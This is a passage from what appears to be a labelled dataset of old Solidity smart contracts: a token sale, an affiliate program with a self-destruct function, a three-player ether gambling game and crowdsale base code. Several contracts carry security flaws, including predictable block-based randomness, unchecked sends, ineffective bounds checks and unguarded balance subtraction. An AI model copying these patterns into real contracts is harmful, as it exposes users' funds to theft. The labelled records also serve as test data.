onlyOwner {\r\r\n        isSelling = newStatus;\r\r\n    }\r\r\n\r\r\n    function buy() payable {\r\r\n        if(isSelling == false) revert();\r\r\n        uint amount = msg.value * buyRate;                  \/\/ calculates the amount\r\r\n        balanceOf[msg.sender] += amount;                   \/\/ adds the amount to buyer&#39;s balance\r\r\n        balanceOf[owner] -= amount;                         \/\/ subtracts amount from seller&#39;s balance\r\r\n        Transfer(owner, msg.sender, amount);                \/\/ execute an event reflecting the change\r\r\n    }\r\r\n    \r\r\n    function withdrawToOwner(uint256 amountWei) onlyOwner {\r\r\n        owner.transfer(amountWei);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.15;\r\r\n\r\r\n\r\r\ncontract BMICOAffiliateProgramm {\r\r\n    mapping (string => address) partnersPromo;\r\r\n    mapping (address => uint256) referrals;\r\r\n\r\r\n    struct itemPartners {\r\r\n        uint256 balance;\r\r\n        string promo;\r\r\n        bool create;\r\r\n    }\r\r\n    mapping (address => itemPartners) partnersInfo;\r\r\n\r\r\n    uint256 public ref_percent = 100; \/\/1 = 0.01%, 10000 = 100%\r\r\n\r\r\n\r\r\n    struct itemHistory {\r\r\n    uint256 datetime;\r\r\n    address referral;\r\r\n    uint256 amount_invest;\r\r\n    }\r\r\n    mapping(address => itemHistory[]) history;\r\r\n\r\r\n    uint256 public amount_referral_invest;\r\r\n\r\r\n    address public owner;\r\r\n    address public contractPreICO;\r\r\n    address public contractICO;\r\r\n\r\r\n    function BMICOAffiliateProgramm(){\r\r\n        owner = msg.sender;\r\r\n        contractPreICO = address(0x0);\r\r\n        contractICO = address(0x0);\r\r\n    }\r\r\n\r\r\n    modifier isOwner()\r\r\n    {\r\r\n        assert(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function str_length(string x) constant internal returns (uint256) {\r\r\n        bytes32 str;\r\r\n        assembly {\r\r\n        str := mload(add(x, 32))\r\r\n        }\r\r\n        bytes memory bytesString = new bytes(32);\r\r\n        uint256 charCount = 0;\r\r\n        for (uint j = 0; j < 32; j++) {\r\r\n            byte char = byte(bytes32(uint(str) * 2 ** (8 * j)));\r\r\n            if (char != 0) {\r\r\n                bytesString[charCount] = char;\r\r\n                charCount++;\r\r\n            }\r\r\n        }\r\r\n        return charCount;\r\r\n    }\r\r\n\r\r\n    function changeOwner(address new_owner) isOwner {\r\r\n        assert(new_owner!=address(0x0));\r\r\n        assert(new_owner!=address(this));\r\r\n\r\r\n        owner = new_owner;\r\r\n    }\r\r\n\r\r\n    function setReferralPercent(uint256 new_percent) isOwner {\r\r\n        ref_percent = new_percent;\r\r\n    }\r\r\n\r\r\n    function setContractPreICO(address new_address) isOwner {\r\r\n        assert(contractPreICO==address(0x0));\r\r\n        assert(new_address!=address(0x0));\r\r\n        assert(new_address!=address(this));\r\r\n\r\r\n        contractPreICO = new_address;\r\r\n    }\r\r\n\r\r\n    function setContractICO(address new_address) isOwner {\r\r\n        assert(contractICO==address(0x0));\r\r\n        assert(new_address!=address(0x0));\r\r\n        assert(new_address!=address(this));\r\r\n\r\r\n        contractICO = new_address;\r\r\n    }\r\r\n\r\r\n    function setPromoToPartner(string promo) {\r\r\n        assert(partnersPromo[promo]==address(0x0));\r\r\n\r\r\n        assert(str_length(promo)>0 && str_length(promo)<=6);\r\r\n\r\r\n        partnersPromo[promo] = msg.sender;\r\r\n        partnersInfo[msg.sender].balance = 0;\r\r\n        partnersInfo[msg.sender].promo = promo;\r\r\n        partnersInfo[msg.sender].create = true;\r\r\n    }\r\r\n\r\r\n    function checkPromo(string promo) constant returns(bool){\r\r\n        return partnersPromo[promo]!=address(0x0);\r\r\n    }\r\r\n\r\r\n    function calc_partnerPercent(uint256 ref_amount_invest) constant internal returns(uint16 percent){\r\r\n        percent = 0;\r\r\n        if(ref_amount_invest > 0){\r\r\n            if(ref_amount_invest < 2 ether){\r\r\n                percent = 100; \/\/1 = 0.01%, 10000 = 100%\r\r\n            }\r\r\n            else if(ref_amount_invest >= 2 ether && ref_amount_invest < 3 ether){\r\r\n                percent = 200;\r\r\n            }\r\r\n            else if(ref_amount_invest >= 3 ether && ref_amount_invest < 4 ether){\r\r\n                percent = 300;\r\r\n            }\r\r\n            else if(ref_amount_invest >= 4 ether && ref_amount_invest < 5 ether){\r\r\n                percent = 400;\r\r\n            }\r\r\n            else if(ref_amount_invest >= 5 ether){\r\r\n                percent = 500;\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function partnerInfo(address partner_address) constant internal returns(string promo, uint256 balance, uint256[] h_datetime, uint256[] h_invest, address[] h_referrals){\r\r\n        if(partner_address != address(0x0) && partnersInfo[partner_address].create){\r\r\n            promo = partnersInfo[partner_address].promo;\r\r\n            balance = partnersInfo[partner_address].balance;\r\r\n\r\r\n            h_datetime = new uint256[](history[partner_address].length);\r\r\n            h_invest = new uint256[](history[partner_address].length);\r\r\n            h_referrals = new address[](history[partner_address].length);\r\r\n\r\r\n            for(var i=0; i<history[partner_address].length; i++){\r\r\n                h_datetime[i] = history[partner_address][i].datetime;\r\r\n                h_invest[i] = history[partner_address][i].amount_invest;\r\r\n                h_referrals[i] = history[partner_address][i].referral;\r\r\n            }\r\r\n        }\r\r\n        else{\r\r\n            promo = &#39;-1&#39;;\r\r\n            balance = 0;\r\r\n            h_datetime = new uint256[](0);\r\r\n            h_invest = new uint256[](0);\r\r\n            h_referrals = new address[](0);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function partnerInfo_for_Partner(bytes32 hash, uint8 v, bytes32 r, bytes32 s) constant returns(string, uint256, uint256[], uint256[], address[]){\r\r\n        address partner_address = ecrecover(hash, v, r, s);\r\r\n        return partnerInfo(partner_address);\r\r\n    }\r\r\n\r\r\n    function partnerInfo_for_Owner (address partner) isOwner constant returns(string, uint256, uint256[], uint256[], address[]){\r\r\n        return partnerInfo(partner);\r\r\n    }\r\r\n\r\r\n    function add_referral(address referral, string promo, uint256 amount) external returns(address partner, uint256 p_partner, uint256 p_referral){\r\r\n        p_partner = 0;\r\r\n        p_referral = 0;\r\r\n        partner = address(0x0);\r\r\n        if (msg.sender == contractPreICO || msg.sender == contractICO){\r\r\n            if(partnersPromo[promo] != address(0x0) && partnersPromo[promo] != referral){\r\r\n                partner = partnersPromo[promo];\r\r\n                referrals[referral] += amount;\r\r\n                amount_referral_invest += amount;\r\r\n                partnersInfo[partnersPromo[promo]].balance += amount;\r\r\n                history[partnersPromo[promo]].push(itemHistory(now, referral, amount));\r\r\n                p_partner = (amount*uint256(calc_partnerPercent(amount)))\/10000;\r\r\n                p_referral = (amount*ref_percent)\/10000;\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n\r\r\n    \/*delete function before release contract*\/\r\r\n    function kill() isOwner {\r\r\n        selfdestruct(msg.sender);\r\r\n    }\r\r\n}","label":1}
{"code":"contract ParallelGambling {\r\r\n    \r\r\n    \/\/--------parameters\r\r\n    uint[3] private deposit;\r\r\n    uint private feesThousandth = 10;       \/\/1% of fees !\r\r\n    uint private time_max = 6 * 60 * 60;   \/\/6 hours in seconds, time to wait before you can cancel the round\r\r\n    uint private fees = 0; \r\r\n    \r\r\n    \/\/percentage of attribution of differents prizes\r\r\n    uint private first_prize = 170;     \/\/Big winner gets 160 %\r\r\n    uint private second_prize = 130;    \/\/Little winner gets 140 %\r\r\n    uint private third_prize = 0;       \/\/looser gets nothing !\r\r\n    \r\r\n    \/\/--Contract ledger for the 3 \"play zones\"\r\r\n    \r\r\n    uint[3] private Balance;\r\r\n    uint[3] private id;\r\r\n    uint[3] private cursor;\r\r\n    uint[3] private nb_player ;\r\r\n    uint[3] private last_time ;\r\r\n    \r\r\n    \/\/ -- random uniformers -\r\r\n\tuint256 private toss1;\r\r\n\tuint256 private toss2;\r\r\n\t\r\r\n\t\r\r\n    address private admin;\r\r\n    \r\r\n    \/\/Constructor - executed on creation only\r\r\n    function ParallelGambling() {\r\r\n        admin = msg.sender;\r\r\n        uint i;\r\r\n        \/\/*****initiate everything properly****\r\r\n        for(i=0;i<3;i++){\r\r\n            Balance[i]=0;\r\r\n            last_time[i] = block.timestamp;\r\r\n            nb_player[i]=0;\r\r\n            id[i]=0;\r\r\n\t\t\tcursor[i]=0;\r\r\n        }\r\r\n        deposit[0]= 100 finney; \/\/ ZONE 1\r\r\n        deposit[1]= 1 ether;    \/\/ ZONE 2\r\r\n        deposit[2]= 5 ether;    \/\/ ZONE 3\r\r\n    }\r\r\n\r\r\n    modifier onlyowner {if (msg.sender == admin) _  }\r\r\n\r\r\n    \r\r\n    struct Player { \/\/for each entry\r\r\n        address addr;\r\r\n        uint payout; \/\/this section is filled when payout are done !\r\r\n        bool paid;\r\r\n    }\r\r\n    \r\r\n    Player[][3] private players;\r\r\n\t\r\r\n\t\r\r\n\tstruct GamblerStats { \/\/for each address, to keep a record\r\r\n\t\tuint bets;\r\r\n\t\tuint deposits;\r\r\n\t\tuint paid;\r\r\n\t}\r\r\n\tmapping(address => GamblerStats) private gamblers;\r\r\n\r\r\n    \r\r\n    function() {\r\r\n        init();\r\r\n    }\r\r\n\r\r\n    \r\r\n    function init() private {\r\r\n        \/\/------ Verifications to select play zone-----\r\r\n        uint256 actual_deposit = msg.value;\r\r\n        uint zone_selected;\r\r\n        \r\r\n        if (actual_deposit < deposit[0]) { \/\/not enough for any zones !\r\r\n            msg.sender.send(actual_deposit);\r\r\n            return;\r\r\n        }\r\r\n        if(actual_deposit >= deposit[0] && actual_deposit < deposit[1]){   \/\/ GAME ZONE 1\r\r\n\t\t\tif( actual_deposit-deposit[0] >0){\r\r\n\t\t\t\tmsg.sender.send(actual_deposit-deposit[0]);\r\r\n\t\t\t}\r\r\n            actual_deposit=deposit[0];\r\r\n            zone_selected=0;\r\r\n        }\r\r\n        if(actual_deposit >= deposit[1] && actual_deposit < deposit[2]){   \/\/ GAME ZONE 2\r\r\n\t\t\tif( actual_deposit-deposit[1] >0){\r\r\n\t\t\t\tmsg.sender.send(actual_deposit-deposit[1]);\r\r\n\t\t\t}\r\r\n            actual_deposit=deposit[1];\r\r\n            zone_selected=1;\r\r\n        }\r\r\n        if(actual_deposit >= deposit[2]){                             \/\/ GAME ZONE 3\r\r\n\t\t\tif( actual_deposit-deposit[2] >0){\r\r\n\t\t\t\tmsg.sender.send(actual_deposit-deposit[2]);\r\r\n\t\t\t}\r\r\n            actual_deposit=deposit[2];\r\r\n            zone_selected=2;\r\r\n        }\r\r\n        \r\r\n        \/\/----update balances and ledger according to the playing zone selected---\r\r\n        \r\r\n        fees += (actual_deposit * feesThousandth) \/ 1000;      \/\/ collect 1% fee\r\r\n        Balance[zone_selected] += (actual_deposit * (1000 - feesThousandth )) \/ 1000; \/\/update balance\r\r\n        \r\r\n        last_time[zone_selected] = block.timestamp;\r\r\n        \r\r\n        players[zone_selected].length++;\r\r\n        players[zone_selected][cursor[zone_selected]]=(Player(msg.sender,  0 , false));\r\r\n\t\tcursor[zone_selected]++;\r\r\n        nb_player[zone_selected]++;\r\r\n\t\t\r\r\n\t\t\/\/update stats\r\r\n\t\tgamblers[msg.sender].bets++;\r\r\n\t\tgamblers[msg.sender].deposits += actual_deposit;\r\r\n\t\t\r\r\n\t\t\/\/random\r\r\n\t\tif(nb_player[zone_selected]%2 ==0)\ttoss1 = uint256(sha3(msg.gas)) + uint256(sha3(block.timestamp));\r\r\n\t\telse toss2 = uint256(sha3(tx.gasprice+block.difficulty)); \r\r\n        \r\r\n        \/\/-check if end of the round\r\r\n        if(nb_player[zone_selected] == 3){ \/\/end of a round\r\r\n            EndRound(zone_selected);\r\r\n        }\r\r\n    }\r\r\n    \r\r\n    function EndRound(uint zone) private{\r\r\n        \r\r\n        \/\/randomness is created here from previous toss\r\r\n        uint256 toss = toss1+toss2+msg.value; \/\/send a value higher than the required deposit to create more randomness if you are the third player (ending round).\r\r\n\t\t\/\/indices of players\r\r\n        uint i_big_winner;\r\r\n        uint i_small_winner;\r\r\n        uint i_looser;\r\r\n        \r\r\n        if( toss % 3 == 0 ){\r\r\n            i_big_winner=id[zone];\r\r\n            i_small_winner=id[zone]+1;\r\r\n            i_looser =id[zone]+2;\r\r\n        }\r\r\n        else if( toss % 3 == 1){\r\r\n            i_big_winner=id[zone]+2;\r\r\n            i_small_winner=id[zone];\r\r\n            i_looser =id[zone]+1;\r\r\n        }\r\r\n        else{\r\r\n            i_big_winner=id[zone]+1;\r\r\n            i_small_winner=id[zone]+2;\r\r\n            i_looser =id[zone];\r\r\n        }\r\r\n        \r\r\n        uint256 effective_bet = (deposit[zone] * (1000 - feesThousandth )) \/ 1000;\r\r\n        \r\r\n        players[zone][i_big_winner].addr.send(effective_bet*first_prize\/100);     \/\/big win\r\r\n        players[zone][i_small_winner].addr.send(effective_bet*second_prize\/100);    \/\/small win\r\r\n        if(third_prize > 0){\r\r\n            players[zone][i_small_winner].addr.send(effective_bet*third_prize\/100);    \/\/looser\r\r\n        }\r\r\n        \r\r\n        \/\/update zone information\r\r\n        players[zone][i_big_winner].payout=effective_bet*first_prize\/100;\r\r\n        players[zone][i_small_winner].payout=effective_bet*second_prize\/100;\r\r\n        players[zone][i_looser].payout=effective_bet*third_prize\/100;\r\r\n        players[zone][id[zone]].paid=true;\r\r\n        players[zone][id[zone]+1].paid=true;\r\r\n        players[zone][id[zone]+2].paid=true;\r\r\n\t\t\/\/update gamblers ledger\r\r\n\t\tgamblers[players[zone][i_big_winner].addr].paid += players[zone][i_big_winner].payout;\r\r\n\t\tgamblers[players[zone][i_small_winner].addr].paid += players[zone][i_small_winner].payout;\r\r\n\t\tgamblers[players[zone][i_looser].addr].paid += players[zone][i_looser].payout;\r\r\n\t\t\r\r\n        Balance[zone]=0;\r\r\n        nb_player[zone]=0;\r\r\n        id[zone] += 3;\r\r\n    }\r\r\n\r\r\n    \r\r\n    function CancelRoundAndRefundAll(uint zone) { \/\/refund every participants in a zone, anyone can call this !\r\r\n        if(zone<0 && zone>3) throw;\r\r\n        if(nb_player[zone]==0) return;\r\r\n        \r\r\n        uint256 pay=(deposit[zone] * (1000 - feesThousandth )) \/ 1000;\r\r\n        \r\r\n        if (last_time[zone] + time_max < block.timestamp) {\r\r\n            for(uint i=id[zone]; i<(id[zone]+nb_player[zone]); i++){\r\r\n                players[zone][i].addr.send(pay);\r\r\n                players[zone][i].paid=true;\r\r\n                players[zone][i].payout=pay;\r\r\n\t\t\t\t\r\r\n\t\t\t\tgamblers[players[zone][i].addr].bets--;\r\r\n\t\t\t\tgamblers[players[zone][i].addr].deposits -= pay;\r\r\n            }\r\r\n            id[zone] += nb_player[zone];\r\r\n            nb_player[zone]=0;\r\r\n\t\t\tBalance[zone]=0;\r\r\n\t\t\t\/\/remove informations from stats - cancelling = removing\r\r\n\t\t\t\r\r\n        }\r\r\n    }\r\r\n    \r\r\n    \/\/------------ Contract informations -----------------------------------\r\r\n    \r\r\n    \r\r\n    function LookAtBalance() constant returns(uint BalanceOfZone1,uint BalanceOfZone2,uint BalanceOfZone3, string info) {\r\r\n        BalanceOfZone1 = Balance[0] \/  1 finney;\r\r\n        BalanceOfZone2 = Balance[1] \/  1 finney;\r\r\n        BalanceOfZone3 = Balance[2] \/  1 finney;\r\r\n        info =&#39;Balances of all play zones in finney&#39;;\r\r\n    }\r\r\n    \r\r\n    function PlayerInfoPerZone(uint id, uint zone) constant returns(address Address, uint Payout, bool UserPaid, string info) {\r\r\n        if(zone<0 && zone>3) throw;\r\r\n        if (id <= players[zone].length) {\r\r\n            Address = players[zone][id].addr;\r\r\n            Payout = (players[zone][id].payout) \/ 1 finney;\r\r\n            UserPaid= players[zone][id].paid;\r\r\n        }\r\r\n\t\t\r\r\n\t\tinfo = &#39;Select zone between 0 and 2, then use the id to look trough this zone&#39;;\r\r\n    }\r\r\n    \r\r\n    function LookAtLastTimePerZone(uint zone) constant returns(uint LastTimeForSelectedZone,uint TimeToWaitEnablingRefund, string info) {\r\r\n        if(zone<0 && zone>3) throw;\r\r\n        LastTimeForSelectedZone = last_time[zone];\r\r\n        TimeToWaitEnablingRefund = time_max;\r\r\n        info =&#39;Timestamps, use this to know when you can cancel a round to get back funds, TimeToWait in seconds !&#39;;\r\r\n    }\r\r\n\r\r\n    function LookAtCollectedFees() constant returns(uint Fees, string info) {\r\r\n        Fees = fees \/ 1 finney;\r\r\n\t\tinfo = &#39;Fees collected, in finney.&#39;;\r\r\n    }\r\r\n    \r\r\n    \r\r\n    function LookAtDepositsToPlay() constant returns(uint InZone1,uint InZone2,uint InZone3, string info) {\r\r\n        InZone1 = deposit[0] \/ 1 finney;\r\r\n        InZone2 = deposit[1] \/ 1 finney;\r\r\n        InZone3 = deposit[2] \/ 1 finney;\r\r\n\t\tinfo = &#39;Deposit for each zones, in finney. Surpus are always refunded.&#39;;\r\r\n    }\r\r\n\r\r\n    function LookAtPrizes() constant returns(uint FirstPrize,uint SecondPrize,uint LooserPrize, string info) {\r\r\n\t\tFirstPrize=first_prize;\r\r\n\t\tSecondPrize=second_prize;\r\r\n\t\tLooserPrize=third_prize;\r\r\n\t\r\r\n\t\tinfo = &#39;Prizes in percent of the deposit&#39;;\r\r\n    }\r\r\n\t\r\r\n\tfunction GamblerPerAddress(address addr) constant returns(uint Bets, uint Deposited, uint PaidOut, string info) {\r\r\n\t\tBets      = gamblers[addr].bets;\r\r\n\t\tDeposited = gamblers[addr].deposits \/ 1 finney;\r\r\n\t\tPaidOut   = gamblers[addr].paid \/ 1 finney;\r\r\n\t\tinfo =&#39;Bets is the number of time you participated, no matter the zone.&#39;;\r\r\n\t}\r\r\n\t\r\r\n    function LookAtNumberOfPlayers() constant returns(uint InZone1,uint InZone2,uint InZone3, string info) {\r\r\n        InZone1 = nb_player[0];\r\r\n        InZone2 = nb_player[1];\r\r\n        InZone3 = nb_player[2];\r\r\n\t\t\r\r\n\t\tinfo = &#39;Players in a round, in each zones.&#39;;\r\r\n    }\r\r\n    \/\/----------- Contract management functions -------------------------\r\r\n    \r\r\n    function ChangeOwnership(address _owner) onlyowner {\r\r\n        admin = _owner;\r\r\n    }\r\r\n\t\r\r\n\t\r\r\n    function ModifyFeeFraction(uint new_fee) onlyowner {\r\r\n\t\tif( new_fee>=0 && new_fee<=20 ){ \/\/admin can only set the fee percentage between 0 and 2%, initially 1%\r\r\n\t\t\tfeesThousandth = new_fee;\r\r\n\t\t}\r\r\n    }\r\r\n    \r\r\n    \/\/function to modify settings, only if no player in a round !\r\r\n    function ModifySettings(uint new_time_max, uint new_first_prize, uint new_second_prize, uint new_third_prize,\r\r\n                            uint deposit_1,uint deposit_2,uint deposit_3) onlyowner {\r\r\n        if(nb_player[0]!=0 || nb_player[1]!=0 || nb_player[2]!=0 ) throw; \/\/can only modify if nobody plays !\r\r\n        \r\r\n        if(new_time_max>=(1 * 60 * 60) && new_time_max<=(24 * 60 * 60) ) time_max=new_time_max;\r\r\n\t\t\r\r\n\t\tif((new_first_prize+new_second_prize+new_third_prize)==300){ \/\/the total must be distributed in a correct way\r\r\n\t\t\tif(new_first_prize>=130 && new_first_prize<=190){\t\t\t\r\r\n\t\t\t\tfirst_prize=new_first_prize;\r\r\n\t\t\t\tif(new_second_prize>100 && new_second_prize<=130){\r\r\n\t\t\t\t\tsecond_prize=new_second_prize;\r\r\n\t\t\t\t\tif(new_third_prize>=0 && new_third_prize<=50) third_prize=new_third_prize;\r\r\n\t\t\t\t}\r\r\n\t\t\t}\r\r\n        }\r\r\n        if(deposit_1>=(1 finney) && deposit_1<(1 ether)) deposit[0]=deposit_1;\r\r\n        if(deposit_2>=(1 ether) && deposit_2<(5 ether)) deposit[1]=deposit_2;\r\r\n        if(deposit_3>=(5 ether) && deposit_3<=(20 ether)) deposit[2]=deposit_3;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function CollectAllFees() onlyowner { \/\/it just send fees, that&#39;s all folks !\r\r\n        if (fees == 0) throw;\r\r\n        admin.send(fees);\r\r\n        fees = this.balance -Balance[0]-Balance[1]-Balance[2]; \/\/just in case there is lost ethers.\r\r\n    }\r\r\n}","label":0}
{"code":"\/**\r\r\n * Safe unsigned safe math.\r\r\n *\r\r\n * https:\/\/blog.aragon.one\/library-driven-development-in-solidity-2bebcaf88736#.750gwtwli\r\r\n *\r\r\n * Originally from https:\/\/raw.githubusercontent.com\/AragonOne\/zeppelin-solidity\/master\/contracts\/SafeMathLib.sol\r\r\n *\r\r\n * Maintained here until merged to mainline zeppelin-solidity.\r\r\n *\r\r\n *\/\r\r\nlibrary SafeMathLib {\r\r\n\r\r\n  function times(uint a, uint b) returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function minus(uint a, uint b) returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function plus(uint a, uint b) returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) private {\r\r\n    if (!assertion) throw;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    if (msg.sender != owner) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/*\r\r\n * Haltable\r\r\n *\r\r\n * Abstract contract that allows children to implement an\r\r\n * emergency stop mechanism. Differs from Pausable by causing a throw when in halt mode.\r\r\n *\r\r\n *\r\r\n * Originally envisioned in FirstBlood ICO contract.\r\r\n *\/\r\r\ncontract Haltable is Ownable {\r\r\n  bool public halted;\r\r\n\r\r\n  modifier stopInEmergency {\r\r\n    if (halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier onlyInEmergency {\r\r\n    if (!halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on emergency, triggers stopped state\r\r\n  function halt() external onlyOwner {\r\r\n    halted = true;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on end of emergency, returns to normal state\r\r\n  function unhalt() external onlyOwner onlyInEmergency {\r\r\n    halted = false;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Interface for defining crowdsale pricing.\r\r\n *\/\r\r\ncontract PricingStrategy {\r\r\n\r\r\n  \/** Interface declaration. *\/\r\r\n  function isPricingStrategy() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/** Self check if all references are correctly set.\r\r\n   *\r\r\n   * Checks that pricing strategy matches crowdsale parameters.\r\r\n   *\/\r\r\n  function isSane(address crowdsale) public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * When somebody tries to buy tokens for X eth, calculate how many tokens they get.\r\r\n   *\r\r\n   *\r\r\n   * @param value - What is the value of the transaction send in as wei\r\r\n   * @param tokensSold - how much tokens have been sold this far\r\r\n   * @param weiRaised - how much money has been raised this far\r\r\n   * @param msgSender - who is the investor of this transaction\r\r\n   * @param decimals - how many decimal units the token has\r\r\n   * @return Amount of tokens the investor receives\r\r\n   *\/\r\r\n  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Finalize agent defines what happens at the end of succeseful crowdsale.\r\r\n *\r\r\n * - Allocate tokens for founders, bounties and community\r\r\n * - Make tokens transferable\r\r\n * - etc.\r\r\n *\/\r\r\ncontract FinalizeAgent {\r\r\n\r\r\n  function isFinalizeAgent() public constant returns(bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/** Return true if we can run finalizeCrowdsale() properly.\r\r\n   *\r\r\n   * This is a safety check function that doesn&#39;t allow crowdsale to begin\r\r\n   * unless the finalizer has been set up properly.\r\r\n   *\/\r\r\n  function isSane() public constant returns (bool);\r\r\n\r\r\n  \/** Called once by crowdsale finalize() if the sale was success. *\/\r\r\n  function finalizeCrowdsale();\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * ERC20 interface\r\r\n * see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n\r\r\n  function transfer(address to, uint value) returns (bool ok);\r\r\n  function transferFrom(address from, address to, uint value) returns (bool ok);\r\r\n  function approve(address spender, uint value) returns (bool ok);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token that defines fractional units as decimals.\r\r\n *\/\r\r\ncontract FractionalERC20 is ERC20 {\r\r\n\r\r\n  uint public decimals;\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Abstract base contract for token sales.\r\r\n *\r\r\n * Handle\r\r\n * - start and end dates\r\r\n * - accepting investments\r\r\n * - minimum funding goal and refund\r\r\n * - various statistics during the crowdfund\r\r\n * - different pricing strategies\r\r\n * - different investment policies (require server side customer id, allow only whitelisted addresses)\r\r\n *\r\r\n *\/\r\r\ncontract Crowdsale is Haltable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  \/* The token we are selling *\/\r\r\n  FractionalERC20 public token;\r\r\n\r\r\n  \/* How we are going to price our offering *\/\r\r\n  PricingStrategy public pricingStrategy;\r\r\n\r\r\n  \/* Post-success callback *\/\r\r\n  FinalizeAgent public finalizeAgent;\r\r\n\r\r\n  \/* tokens will be transfered from this address *\/\r\r\n  address public multisigWallet;\r\r\n\r\r\n  \/* if the funding goal is not reached, investors may withdraw their funds *\/\r\r\n  uint public minimumFundingGoal;\r\r\n\r\r\n  \/* the UNIX timestamp start date of the crowdsale *\/\r\r\n  uint public startsAt;\r\r\n\r\r\n  \/* the UNIX timestamp end date of the crowdsale *\/\r\r\n  uint public endsAt;\r\r\n\r\r\n  \/* the number of tokens already sold through this contract*\/\r\r\n  uint public tokensSold = 0;\r\r\n\r\r\n  \/* How many wei of funding we have raised *\/\r\r\n  uint public weiRaised = 0;\r\r\n\r\r\n  \/* How many distinct addresses have invested *\/\r\r\n  uint public investorCount = 0;\r\r\n\r\r\n  \/* How much wei we have returned back to the contract after a failed crowdfund. *\/\r\r\n  uint public loadedRefund = 0;\r\r\n\r\r\n  \/* How much wei we have given back to investors.*\/\r\r\n  uint public weiRefunded = 0;\r\r\n\r\r\n  \/* Has this crowdsale been finalized *\/\r\r\n  bool public finalized;\r\r\n\r\r\n  \/* Do we need to have unique contributor id for each customer *\/\r\r\n  bool public requireCustomerId;\r\r\n\r\r\n  \/**\r\r\n    * Do we verify that contributor has been cleared on the server side (accredited investors only).\r\r\n    * This method was first used in FirstBlood crowdsale to ensure all contributors have accepted terms on sale (on the web).\r\r\n    *\/\r\r\n  bool public requiredSignedAddress;\r\r\n\r\r\n  \/* Server side address that signed allowed contributors (Ethereum addresses) that can participate the crowdsale *\/\r\r\n  address public signerAddress;\r\r\n\r\r\n  \/** How much ETH each address has invested to this crowdsale *\/\r\r\n  mapping (address => uint256) public investedAmountOf;\r\r\n\r\r\n  \/** How much tokens this crowdsale has credited for each investor address *\/\r\r\n  mapping (address => uint256) public tokenAmountOf;\r\r\n\r\r\n  \/** Addresses that are allowed to invest even before ICO offical opens. For testing, for ICO partners, etc. *\/\r\r\n  mapping (address => bool) public earlyParticipantWhitelist;\r\r\n\r\r\n  \/** This is for manul testing for the interaction from owner wallet. You can set it to any value and inspect this in blockchain explorer to see that crowdsale interaction works. *\/\r\r\n  uint public ownerTestValue;\r\r\n\r\r\n  \/** State machine\r\r\n   *\r\r\n   * - Preparing: All contract initialization calls and variables have not been set yet\r\r\n   * - Prefunding: We have not passed start time yet\r\r\n   * - Funding: Active crowdsale\r\r\n   * - Success: Minimum funding goal reached\r\r\n   * - Failure: Minimum funding goal not reached before ending time\r\r\n   * - Finalized: The finalized has been called and succesfully executed\r\r\n   * - Refunding: Refunds are loaded on the contract for reclaim.\r\r\n   *\/\r\r\n  enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\r\r\n\r\r\n  \/\/ A new investment was made\r\r\n  event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\r\r\n\r\r\n  \/\/ Refund was processed for a contributor\r\r\n  event Refund(address investor, uint weiAmount);\r\r\n\r\r\n  \/\/ The rules were changed what kind of investments we accept\r\r\n  event InvestmentPolicyChanged(bool requireCustomerId, bool requiredSignedAddress, address signerAddress);\r\r\n\r\r\n  \/\/ Address early participation whitelist status changed\r\r\n  event Whitelisted(address addr, bool status);\r\r\n\r\r\n  \/\/ Crowdsale end time has been changed\r\r\n  event EndsAtChanged(uint endsAt);\r\r\n\r\r\n  function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\r\r\n\r\r\n    owner = msg.sender;\r\r\n\r\r\n    token = 